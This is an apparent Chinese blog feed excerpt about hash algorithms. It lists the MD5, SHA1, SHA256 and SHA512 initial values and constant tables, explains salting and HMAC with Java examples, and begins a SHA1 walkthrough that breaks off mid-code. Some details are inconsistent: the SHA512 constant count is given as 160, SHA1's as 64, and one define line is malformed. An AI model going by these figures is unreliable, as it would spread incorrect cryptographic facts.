        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一-常见哈希算法介绍"><a href="#一-常见哈希算法介绍" class="headerlink" title="一 常见哈希算法介绍"></a>一 常见哈希算法介绍</h1><h2 id="哈希算法对比"><a href="#哈希算法对比" class="headerlink" title="哈希算法对比"></a>哈希算法对比</h2><table><thead><tr><th><strong>算法</strong></th><th><strong>返回值长度(hex)</strong></th><th><strong>初始化链接向量(hex)</strong></th><th><strong>常量表(k表)【个】</strong></th></tr></thead><tbody><tr><td><strong>MD5</strong></td><td>32byte</td><td>32byte(4个)</td><td>64</td></tr><tr><td><strong>SHA1</strong></td><td>40byte</td><td>40byte(5个)</td><td>4</td></tr><tr><td><strong>SHA256</strong></td><td>64byte</td><td>64byte(8个)</td><td>64</td></tr><tr><td><strong>SHA512</strong></td><td>128byte</td><td>128byte(8个)</td><td>160(32byte)</td></tr></tbody></table><h3 id="初始化链接向量"><a href="#初始化链接向量" class="headerlink" title="初始化链接向量"></a>初始化链接向量</h3><p>MD5：4个&#x3D;32byte</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">context-&gt;state[0] = 0x67452301;</span><br><span class="line">context-&gt;state[1] = 0xefcdab89;</span><br><span class="line">context-&gt;state[2] = 0x98badcfe;</span><br><span class="line">context-&gt;state[3] = 0x10325476;</span><br></pre></td></tr></table></figure><p>SHA1：5个&#x3D;40byte</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define INIT_DATA_h0 0x67452301UL</span><br><span class="line">#define INIT_DATA_h1 0xefcdab89UL</span><br><span class="line">#define INIT_DATA_h2 0x98badcfeUL</span><br><span class="line">#define INIT_DATA_h3 0x10325476UL</span><br><span class="line">#define INIT_DATA_h4 0xc3d2e1f0UL</span><br><span class="line"></span><br><span class="line">c-&gt;h0=INIT_DATA_h0;</span><br><span class="line">c-&gt;h1=INIT_DATA_h1;</span><br><span class="line">c-&gt;h2=INIT_DATA_h2;</span><br><span class="line">c-&gt;h3=INIT_DATA_h3;</span><br><span class="line">c-&gt;h4=INIT_DATA_h4;</span><br></pre></td></tr></table></figure><p>SHA256：8个&#x3D;64byte</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctx-&gt;hash[0] = 0x6a09e667;</span><br><span class="line">ctx-&gt;hash[1] = 0xbb67ae85;</span><br><span class="line">ctx-&gt;hash[2] = 0x3c6ef372; </span><br><span class="line">ctx-&gt;hash[3] = 0xa54ff53a;</span><br><span class="line">ctx-&gt;hash[4] = 0x510e527f; </span><br><span class="line">ctx-&gt;hash[5] = 0x9b05688c;</span><br><span class="line">ctx-&gt;hash[6] = 0x1f83d9ab;</span><br><span class="line">ctx-&gt;hash[7] = 0x5be0cd19;</span><br></pre></td></tr></table></figure><p>SHA512：8个&#x3D;128byte（这块可以看到<strong>SHA512的前8个</strong>十六进制位就是SHA256的初始化链接变量）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">context-&gt;state[0] = 0x6a09e667f3bcc908ULL;</span><br><span class="line">context-&gt;state[1] = 0xbb67ae8584caa73bULL;</span><br><span class="line">context-&gt;state[2] = 0x3c6ef372fe94f82bULL;</span><br><span class="line">context-&gt;state[3] = 0xa54ff53a5f1d36f1ULL;</span><br><span class="line">context-&gt;state[4] = 0x510e527fade682d1ULL;</span><br><span class="line">context-&gt;state[5] = 0x9b05688c2b3e6c1fULL;</span><br><span class="line">context-&gt;state[6] = 0x1f83d9abfb41bd6bULL;</span><br><span class="line">context-&gt;state[7] = 0x5be0cd19137e2179ULL;</span><br></pre></td></tr></table></figure><h3 id="常量表-k表-个"><a href="#常量表-k表-个" class="headerlink" title="常量表(k表)[个]"></a><strong>常量表(k表)[个]</strong></h3><p>MD5：64个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Round 1 */</span><br><span class="line">FF (a, b, c, d, x[ 0], S11, 0xd76aa478); /* 1 */</span><br><span class="line">FF (d, a, b, c, x[ 1], S12, 0xe8c7b756); /* 2 */</span><br><span class="line">FF (c, d, a, b, x[ 2], S13, 0x242070db); /* 3 */</span><br><span class="line">FF (b, c, d, a, x[ 3], S14, 0xc1bdceee); /* 4 */</span><br><span class="line">FF (a, b, c, d, x[ 4], S11, 0xf57c0faf); /* 5 */</span><br><span class="line">FF (d, a, b, c, x[ 5], S12, 0x4787c62a); /* 6 */</span><br><span class="line">FF (c, d, a, b, x[ 6], S13, 0xa8304613); /* 7 */</span><br><span class="line">FF (b, c, d, a, x[ 7], S14, 0xfd469501); /* 8 */</span><br><span class="line">FF (a, b, c, d, x[ 8], S11, 0x698098d8); /* 9 */</span><br><span class="line">FF (d, a, b, c, x[ 9], S12, 0x8b44f7af); /* 10 */</span><br><span class="line">FF (c, d, a, b, x[10], S13, 0xffff5bb1); /* 11 */</span><br><span class="line">FF (b, c, d, a, x[11], S14, 0x895cd7be); /* 12 */</span><br><span class="line">FF (a, b, c, d, x[12], S11, 0x6b901122); /* 13 */</span><br><span class="line">FF (d, a, b, c, x[13], S12, 0xfd987193); /* 14 */</span><br><span class="line">FF (c, d, a, b, x[14], S13, 0xa679438e); /* 15 */</span><br><span class="line">FF (b, c, d, a, x[15], S14, 0x49b40821); /* 16 */</span><br><span class="line">/* Round 2 */</span><br><span class="line">GG (a, b, c, d, x[ 1], S21, 0xf61e2562); /* 17 */</span><br><span class="line">GG (d, a, b, c, x[ 6], S22, 0xc040b340); /* 18 */</span><br><span class="line">GG (c, d, a, b, x[11], S23, 0x265e5a51); /* 19 */</span><br><span class="line">GG (b, c, d, a, x[ 0], S24, 0xe9b6c7aa); /* 20 */</span><br><span class="line">GG (a, b, c, d, x[ 5], S21, 0xd62f105d); /* 21 */</span><br><span class="line">GG (d, a, b, c, x[10], S22,  0x2441453); /* 22 */</span><br><span class="line">GG (c, d, a, b, x[15], S23, 0xd8a1e681); /* 23 */</span><br><span class="line">GG (b, c, d, a, x[ 4], S24, 0xe7d3fbc8); /* 24 */</span><br><span class="line">GG (a, b, c, d, x[ 9], S21, 0x21e1cde6); /* 25 */</span><br><span class="line">GG (d, a, b, c, x[14], S22, 0xc33707d6); /* 26 */</span><br><span class="line">GG (c, d, a, b, x[ 3], S23, 0xf4d50d87); /* 27 */</span><br><span class="line">GG (b, c, d, a, x[ 8], S24, 0x455a14ed); /* 28 */</span><br><span class="line">GG (a, b, c, d, x[13], S21, 0xa9e3e905); /* 29 */</span><br><span class="line">GG (d, a, b, c, x[ 2], S22, 0xfcefa3f8); /* 30 */</span><br><span class="line">GG (c, d, a, b, x[ 7], S23, 0x676f02d9); /* 31 */</span><br><span class="line">GG (b, c, d, a, x[12], S24, 0x8d2a4c8a); /* 32 */</span><br><span class="line">/* Round 3 */</span><br><span class="line">HH (a, b, c, d, x[ 5], S31, 0xfffa3942); /* 33 */</span><br><span class="line">HH (d, a, b, c, x[ 8], S32, 0x8771f681); /* 34 */</span><br><span class="line">HH (c, d, a, b, x[11], S33, 0x6d9d6122); /* 35 */</span><br><span class="line">HH (b, c, d, a, x[14], S34, 0xfde5380c); /* 36 */</span><br><span class="line">HH (a, b, c, d, x[ 1], S31, 0xa4beea44); /* 37 */</span><br><span class="line">HH (d, a, b, c, x[ 4], S32, 0x4bdecfa9); /* 38 */</span><br><span class="line">HH (c, d, a, b, x[ 7], S33, 0xf6bb4b60); /* 39 */</span><br><span class="line">HH (b, c, d, a, x[10], S34, 0xbebfbc70); /* 40 */</span><br><span class="line">HH (a, b, c, d, x[13], S31, 0x289b7ec6); /* 41 */</span><br><span class="line">HH (d, a, b, c, x[ 0], S32, 0xeaa127fa); /* 42 */</span><br><span class="line">HH (c, d, a, b, x[ 3], S33, 0xd4ef3085); /* 43 */</span><br><span class="line">HH (b, c, d, a, x[ 6], S34,  0x4881d05); /* 44 */</span><br><span class="line">HH (a, b, c, d, x[ 9], S31, 0xd9d4d039); /* 45 */</span><br><span class="line">HH (d, a, b, c, x[12], S32, 0xe6db99e5); /* 46 */</span><br><span class="line">HH (c, d, a, b, x[15], S33, 0x1fa27cf8); /* 47 */</span><br><span class="line">HH (b, c, d, a, x[ 2], S34, 0xc4ac5665); /* 48 */</span><br><span class="line">/* Round 4 */</span><br><span class="line">II (a, b, c, d, x[ 0], S41, 0xf4292244); /* 49 */</span><br><span class="line">II (d, a, b, c, x[ 7], S42, 0x432aff97); /* 50 */</span><br><span class="line">II (c, d, a, b, x[14], S43, 0xab9423a7); /* 51 */</span><br><span class="line">II (b, c, d, a, x[ 5], S44, 0xfc93a039); /* 52 */</span><br><span class="line">II (a, b, c, d, x[12], S41, 0x655b59c3); /* 53 */</span><br><span class="line">II (d, a, b, c, x[ 3], S42, 0x8f0ccc92); /* 54 */</span><br><span class="line">II (c, d, a, b, x[10], S43, 0xffeff47d); /* 55 */</span><br><span class="line">II (b, c, d, a, x[ 1], S44, 0x85845dd1); /* 56 */</span><br><span class="line">II (a, b, c, d, x[ 8], S41, 0x6fa87e4f); /* 57 */</span><br><span class="line">II (d, a, b, c, x[15], S42, 0xfe2ce6e0); /* 58 */</span><br><span class="line">II (c, d, a, b, x[ 6], S43, 0xa3014314); /* 59 */</span><br><span class="line">II (b, c, d, a, x[13], S44, 0x4e0811a1); /* 60 */</span><br><span class="line">II (a, b, c, d, x[ 4], S41, 0xf7537e82); /* 61 */</span><br><span class="line">II (d, a, b, c, x[11], S42, 0xbd3af235); /* 62 */</span><br><span class="line">II (c, d, a, b, x[ 2], S43, 0x2ad7d2bb); /* 63 */</span><br><span class="line">II (b, c, d, a, x[ 9], S44, 0xeb86d391); /* 64 */</span><br></pre></td></tr></table></figure><p>SHA1:4个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define K_00_190x5a827999UL</span><br><span class="line">#define K_20_39 0x6ed9eba1UL</span><br><span class="line">#define K_40_59 0x8f1bbcdcUL</span><br><span class="line">#define K_60_79 0xca62c1d6UL</span><br></pre></td></tr></table></figure><p>SHA256：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static const uint32_t K[64] = &#123;</span><br><span class="line">        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,</span><br><span class="line">        0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,</span><br><span class="line">        0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,</span><br><span class="line">        0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,</span><br><span class="line">        0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,</span><br><span class="line">        0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,</span><br><span class="line">        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,</span><br><span class="line">        0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,</span><br><span class="line">        0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,</span><br><span class="line">        0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,</span><br><span class="line">        0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,</span><br><span class="line">        0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,</span><br><span class="line">        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,</span><br><span class="line">        0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,</span><br><span class="line">        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,</span><br><span class="line">        0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>SHA512：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static const unsigned long long K[80] = &#123;</span><br><span class="line">        0x428a2f98d728ae22ULL, 0x7137449123ef65cdULL, 0xb5c0fbcfec4d3b2fULL, 0xe9b5dba58189dbbcULL,</span><br><span class="line">        0x3956c25bf348b538ULL, 0x59f111f1b605d019ULL, 0x923f82a4af194f9bULL, 0xab1c5ed5da6d8118ULL,</span><br><span class="line">        0xd807aa98a3030242ULL, 0x12835b0145706fbeULL, 0x243185be4ee4b28cULL, 0x550c7dc3d5ffb4e2ULL,</span><br><span class="line">        0x72be5d74f27b896fULL, 0x80deb1fe3b1696b1ULL, 0x9bdc06a725c71235ULL, 0xc19bf174cf692694ULL,</span><br><span class="line">        0xe49b69c19ef14ad2ULL, 0xefbe4786384f25e3ULL, 0x0fc19dc68b8cd5b5ULL, 0x240ca1cc77ac9c65ULL,</span><br><span class="line">        0x2de92c6f592b0275ULL, 0x4a7484aa6ea6e483ULL, 0x5cb0a9dcbd41fbd4ULL, 0x76f988da831153b5ULL,</span><br><span class="line">        0x983e5152ee66dfabULL, 0xa831c66d2db43210ULL, 0xb00327c898fb213fULL, 0xbf597fc7beef0ee4ULL,</span><br><span class="line">        0xc6e00bf33da88fc2ULL, 0xd5a79147930aa725ULL, 0x06ca6351e003826fULL, 0x142929670a0e6e70ULL,</span><br><span class="line">        0x27b70a8546d22ffcULL, 0x2e1b21385c26c926ULL, 0x4d2c6dfc5ac42aedULL, 0x53380d139d95b3dfULL,</span><br><span class="line">        0x650a73548baf63deULL, 0x766a0abb3c77b2a8ULL, 0x81c2c92e47edaee6ULL, 0x92722c851482353bULL,</span><br><span class="line">        0xa2bfe8a14cf10364ULL, 0xa81a664bbc423001ULL, 0xc24b8b70d0f89791ULL, 0xc76c51a30654be30ULL,</span><br><span class="line">        0xd192e819d6ef5218ULL, 0xd69906245565a910ULL, 0xf40e35855771202aULL, 0x106aa07032bbd1b8ULL,</span><br><span class="line">        0x19a4c116b8d2d0c8ULL, 0x1e376c085141ab53ULL, 0x2748774cdf8eeb99ULL, 0x34b0bcb5e19b48a8ULL,</span><br><span class="line">        0x391c0cb3c5c95a63ULL, 0x4ed8aa4ae3418acbULL, 0x5b9cca4f7763e373ULL, 0x682e6ff3d6b2b8a3ULL,</span><br><span class="line">        0x748f82ee5defb2fcULL, 0x78a5636f43172f60ULL, 0x84c87814a1f0ab72ULL, 0x8cc702081a6439ecULL,</span><br><span class="line">        0x90befffa23631e28ULL, 0xa4506cebde82bde9ULL, 0xbef9a3f7b2c67915ULL, 0xc67178f2e372532bULL,</span><br><span class="line">        0xca273eceea26619cULL, 0xd186b8c721c0c207ULL, 0xeada7dd6cde0eb1eULL, 0xf57d4f7fee6ed178ULL,</span><br><span class="line">        0x06f067aa72176fbaULL, 0x0a637dc5a2c898a6ULL, 0x113f9804bef90daeULL, 0x1b710b35131c471bULL,</span><br><span class="line">        0x28db77f523047d84ULL, 0x32caab7b40c72493ULL, 0x3c9ebe0a15c9bebcULL, 0x431d67c49c100d4cULL,</span><br><span class="line">        0x4cc5d4becb3e42b6ULL, 0x597f299cfc657e2aULL, 0x5fcb6fab3ad6faecULL, 0x6c44198c4a475817ULL</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="MD5-salt-加盐"><a href="#MD5-salt-加盐" class="headerlink" title="MD5-salt(加盐)"></a>MD5-salt(加盐)</h2><p>顾名思义，就是在MD5的值后面加上了一个常量。</p><p>举个例子：明文字符串为 “123456”，盐为 “hello”。</p><ul><li>正常md5(123456) &#x3D; e10adc3949ba59abbe56e057f20f883e</li><li>加盐md5(123456) &#x3D; 04522abf42bb8ad979fe66948402bc0d</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171437789.png" alt="image.png"> </p><p>正常md5(123456hello) &#x3D; “04522abf42bb8ad979fe66948402bc0d”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171437356.png" alt="image.png"> </p><p>由此可以看出，加盐md5(123456,hello) &#x3D; md5(123456hello)。<strong>所谓的加盐，就是在字符串拼接后再求其md5</strong>。</p><h1 id="二-哈希算法特征寻找-比对"><a href="#二-哈希算法特征寻找-比对" class="headerlink" title="二 哈希算法特征寻找&amp;比对"></a>二 哈希算法特征寻找&amp;比对</h1><p>正常的针对这些算法的特征，就是找他的初始化链接变量和K值。这块以sha512为例</p><p>1、首先看它的链接变量：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171443920.png" alt="image.png"> </p><p>因为32位IDA，只能表示8个十六进制位。所以，这块有16个链接变量（4-19）</p><p>2、再看一下SHA512的K表</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171443970.png" alt="image.png"> </p><h1 id="三-HMAC算法介绍"><a href="#三-HMAC算法介绍" class="headerlink" title="三 HMAC算法介绍"></a>三 HMAC算法介绍</h1><p>在前面讲到哈希算法时，我们说，存储用户的哈希口令时，要加盐存储，目的就在于抵御彩虹表攻击。</p><p>我们回顾一下哈希算法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">digest = hash(input)</span><br></pre></td></tr></table></figure><p>正是因为相同的输入会产生相同的输出，我们加盐的目的就在于，使得输入有所变化：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">digest = hash(salt + input)</span><br></pre></td></tr></table></figure><p>这个salt可以看作是一个额外的“认证码”，同样的输入，不同的认证码，会产生不同的输出。因此，要验证输出的哈希，必须同时提供“认证码”。</p><p><strong>Hmac算法</strong>就是一种基于密钥的消息认证码算法，它的全称是Hash-based Message Authentication Code，是一种更安全的消息摘要算法。</p><p>Hmac算法总是和某种哈希算法配合起来用的。例如，我们使用MD5算法，对应的就是HmacMD5算法，它相当于“加盐”的MD5：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HmacMD5 ≈ md5(secure_random_key, input)</span><br></pre></td></tr></table></figure><p>此，HmacMD5可以看作带有一个安全的key的MD5。使用HmacMD5而不是用MD5加salt，有如下好处：</p><ul><li>HmacMD5使用的key长度是64字节，更安全；</li><li>Hmac是标准算法，同样适用于SHA-1等其他哈希算法；</li><li>Hmac输出和原有的哈希算法长度一致。</li></ul><p>可见，Hmac本质上就是把key混入摘要的算法。验证此哈希时，除了原始的输入数据，还要提供key。</p><p>为了保证安全，我们不会自己指定key，而是通过Java标准库的KeyGenerator生成一个安全的随机的key。下面是使用HmacMD5的代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HexFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">KeyGenerator</span> <span class="variable">keyGen</span> <span class="operator">=</span> KeyGenerator.getInstance(<span class="string">&quot;HmacMD5&quot;</span>);</span><br><span class="line">        <span class="type">SecretKey</span> <span class="variable">key</span> <span class="operator">=</span> keyGen.generateKey();</span><br><span class="line">        <span class="comment">// 打印随机生成的key:</span></span><br><span class="line">        <span class="type">byte</span>[] skey = key.getEncoded();</span><br><span class="line">        System.out.println(HexFormat.of().formatHex(skey));</span><br><span class="line">        <span class="type">Mac</span> <span class="variable">mac</span> <span class="operator">=</span> Mac.getInstance(<span class="string">&quot;HmacMD5&quot;</span>);</span><br><span class="line">        mac.init(key);</span><br><span class="line">        mac.update(<span class="string">&quot;HelloWorld&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[] result = mac.doFinal();</span><br><span class="line">        System.out.println(HexFormat.of().formatHex(result));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和MD5相比，使用HmacMD5的步骤是：</p><ol><li>通过名称HmacMD5获取KeyGenerator实例；</li><li>通过KeyGenerator创建一个SecretKey实例；</li><li>通过名称HmacMD5获取Mac实例；</li><li>用SecretKey初始化Mac实例；</li><li>对Mac实例反复调用update(byte[])输入数据；</li><li>调用Mac实例的doFinal()获取最终的哈希值。</li></ol><p>我们可以用Hmac算法取代原有的自定义的加盐算法，因此，存储用户名和口令的数据库结构如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171548319.png" alt="img"> </p><p>有了Hmac计算的哈希和SecretKey，我们想要验证怎么办？这时，SecretKey不能从KeyGenerator生成，而是从一个byte[]数组恢复：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.*;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HexFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] hkey = HexFormat.of().parseHex(</span><br><span class="line">                <span class="string">&quot;b648ee779d658c420420d86291ec70f5&quot;</span> + </span><br><span class="line">                <span class="string">&quot;cf97521c740330972697a8fad0b55f5c&quot;</span> + </span><br><span class="line">                <span class="string">&quot;5a7924e4afa99d8c5883e07d7c3f9ed0&quot;</span> + </span><br><span class="line">                <span class="string">&quot;76aa544d25ed2f5ceea59dcc122babc8&quot;</span>);</span><br><span class="line">        <span class="type">SecretKey</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(hkey, <span class="string">&quot;HmacMD5&quot;</span>);</span><br><span class="line">        <span class="type">Mac</span> <span class="variable">mac</span> <span class="operator">=</span> Mac.getInstance(<span class="string">&quot;HmacMD5&quot;</span>);</span><br><span class="line">        mac.init(key);</span><br><span class="line">        mac.update(<span class="string">&quot;HelloWorld&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[] result = mac.doFinal();</span><br><span class="line">        System.out.println(HexFormat.of().formatHex(result)); <span class="comment">// 4af40be7864efaae1473a4c601b650ae</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恢复SecretKey的语句就是new SecretKeySpec(hkey, “HmacMD5”)。</p>]]></content>
      
      
      <categories>
          
          <category> 算法还原 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法还原 </tag>
            
            <tag> 哈希算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法还原之SHA1</title>
      <link href="/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BSHA1/"/>
      <url>/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BSHA1/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一-sha1算法原理"><a href="#一-sha1算法原理" class="headerlink" title="一 sha1算法原理"></a>一 sha1算法原理</h1><p>SHA1算法是Hash算法的一种。SHA1算法的最大输入长度小于2^64比特的消息，输入消息（<strong>明文</strong>）以512比特的分组为单位处理，输出160比特的消息摘要（<strong>密文</strong>）</p><p>整个算法的核心是一个包含4轮循环的模块，每轮循环由20个步骤组成。</p><p>具体实现步骤如下：</p><h2 id="1-附加填充位"><a href="#1-附加填充位" class="headerlink" title="1 附加填充位"></a>1 附加填充位</h2><p>消息必须进行填充，以使其长度在对512取模以后的余数是448。也就是说，（填充后的消息长度）%512 &#x3D; 448。即使长度已经满足对512取模后余数是448，填充也必须要进行。<strong>填充的规则是填充一个“1”和若干个“0”使其长度模512和448同余。然后附加64比特的无符号整数，其值为原始消息的长度（这块和MD5是一样的）</strong></p><h2 id="2-附加长度信息"><a href="#2-附加长度信息" class="headerlink" title="2 附加长度信息"></a>2 附加长度信息</h2><p>后面的64比特位，用来填充长度信息，长度单位为比特。<strong>（这块和MD5一样）</strong></p><h2 id="3-信息分组处理"><a href="#3-信息分组处理" class="headerlink" title="3 信息分组处理"></a>3 信息分组处理</h2><p>经过添加位数处理的明文，其长度正好为512位的整数倍，然后按512位的长度进行分组，可以得到一定数量的明文分组，这块可以用Y0,Y1,Y2,…,YN-1来表示，对于每一个分组，进行处理。<strong>（这块和MD5一样）</strong></p><p>而对于每个512位的明文分组，SHA1将其再分成16个更小的明文分组，称为子明文分组，每个子明文分组为32位，这块使用 M<a href="t=0,1,......15">t</a>来表示着16个子明文分组。然后需要将这16个子明文分组扩充到80个子明文分组，分别将其记为 W<a href="t=0,t=1,......,79">t</a>，扩充的具体方法为：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171343817.png" alt="image.png"> </p><h2 id="4-初始化链接向量"><a href="#4-初始化链接向量" class="headerlink" title="4 初始化链接向量"></a>4 初始化链接向量</h2><p>和MD5有些类似，将5个32比特的固定数赋值给5个32比特的寄存器（和汇编里面的寄存器不同，可以理解为变量）A、B、C、D、E作为第一次迭代的链接变量输入：</p><ul><li><strong>A &#x3D; 0x67452301</strong></li><li><strong>B &#x3D; 0xEFCDAB89</strong></li><li><strong>C &#x3D; 0x98BADCFE</strong></li><li><strong>D &#x3D; 0x10325476</strong></li><li><strong>E &#x3D; 0xC3D2E1F0</strong></li></ul><h2 id="5-运算"><a href="#5-运算" class="headerlink" title="5 运算"></a>5 运算</h2><p>经过前面的准备，接下来就是计算信息摘要。SHA1有4轮运算，每一轮包括20个步骤，一共80步。最终<strong>产生160位的信息摘要</strong>，这160位的信息摘要直接存放在5个32位的链接变量中。</p><p>在SHA1的4轮运算中，虽然进行的具体操作函数不同，但是逻辑过程是一致的。首先，定义5个变量，假设为H0、H1、H2、H3、H4，对其分别进行如下操作：</p><ul><li>将A左移5位与函数的结果求和，再与其对应的子明文分组、E以及计算常数求和后的结果赋值给H0</li><li>将A的值赋予H1</li><li>将B左移30位，并赋予H2</li><li>将C的值赋予H3</li><li>将D的值赋予H4</li><li>最后将H0、H1、H2、H3、H4值分别赋予A、B、C、D、E</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171348817.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171348711.png" alt="image.png"> </p><p><strong>K值的获取（MD5中也有K表，只不过 len(md5_k)&#x3D;64，而  len(sha1_k)&#x3D;64）</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171348427.png" alt="image.png"> </p><p>下面是80轮循环的简易代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//第一轮R1[a,b,c,d,e,j]表示e = e + F1(b,c,d)+rol(a,5)+W[j]+K1;b=rol(b,30)</span><br><span class="line">R1(a, b, c, d, e, 0),R1(e, a, b, c, d, 1),R1(d, e, a, b, c, 2),R1(c, d, e, a, b, 3)</span><br><span class="line">R1(b, c, d, e, a, 4),R1(a, b, c, d, e, 5),R1(e, a, b, c, d, 6),R1(d, e, a, b, c, 7)</span><br><span class="line">R1(c, d, e, a, b, 8),R1(b, c, d, e, a, 9),R1(a, b, c, d, e, 10),R1(e, a, b, c, d, 11)</span><br><span class="line">R1(d, e, a, b, c, 12),R1(c, d, e, a, b, 13),R1(b, c, d, e, a, 14),R1(a, b, c, d, e, 15)</span><br><span class="line">R1(e, a, b, c, d, 16),R1(d, e, a, b, c, 17),R1(c, d, e, a, b, 18),R1(b, c, d, e, a, 19)</span><br><span class="line"></span><br><span class="line">//第二轮R2[a,b,c,d,e,j]表示e = e + F2(b,c,d)+rol(a,5)+W[j]+K2;b=rol(b,30)</span><br><span class="line">R2(a, b, c, d, e, 20);R2(e, a, b, c, d, 21);R2(d, e, a, b, c, 22);R2(c, d, e, a, b, 23);</span><br><span class="line">R2(b, c, d, e, a, 24);R2(a, b, c, d, e, 25);R2(e, a, b, c, d, 26);R2(d, e, a, b, c, 27);</span><br><span class="line">R2(c, d, e, a, b, 28);R2(b, c, d, e, a, 29);R2(a, b, c, d, e, 30);R2(e, a, b, c, d, 31);</span><br><span class="line">R2(d, e, a, b, c, 32);R2(c, d, e, a, b, 33);R2(b, c, d, e, a, 34);R2(a, b, c, d, e, 35);</span><br><span class="line">R2(e, a, b, c, d, 36);R2(d, e, a, b, c, 37);R2(c, d, e, a, b, 38);R2(b, c, d, e, a, 39);</span><br><span class="line"></span><br><span class="line">//第三轮R3[a,b,c,d,e,j]表示e = e + F3(b,c,d)+rol(a,5)+W[j]+K3;b=rol(b,30)</span><br><span class="line">R3(a, b, c, d, e, 40);R3(e, a, b, c, d, 41);R3(d, e, a, b, c, 42);R3(c, d, e, a, b, 43);</span><br><span class="line">R3(b, c, d, e, a, 44);R3(a, b, c, d, e, 45);R3(e, a, b, c, d, 46);R3(d, e, a, b, c, 47);</span><br><span class="line">R3(c, d, e, a, b, 48);R3(b, c, d, e, a, 49);R3(a, b, c, d, e, 50);R3(e, a, b, c, d, 51);</span><br><span class="line">R3(d, e, a, b, c, 52);R3(c, d, e, a, b, 53);R3(b, c, d, e, a, 54);R3(a, b, c, d, e, 55);</span><br><span class="line">R3(e, a, b, c, d, 56);R3(d, e, a, b, c, 57);R3(c, d, e, a, b, 58);R3(b, c, d, e, a, 59);</span><br><span class="line"></span><br><span class="line">//第四轮R4[a,b,c,d,e,j]表示e = e + F4(b,c,d)+rol(a,5)+W[j]+K4;b=rol(b,30)</span><br><span class="line">R4(a, b, c, d, e, 60);R4(e, a, b, c, d, 61);R4(d, e, a, b, c, 62);R4(c, d, e, a, b, 63);</span><br><span class="line">R4(b, c, d, e, a, 64);R4(a, b, c, d, e, 65);R4(e, a, b, c, d, 66);R4(d, e, a, b, c, 67);</span><br><span class="line">R4(c, d, e, a, b, 68);R4(b, c, d, e, a, 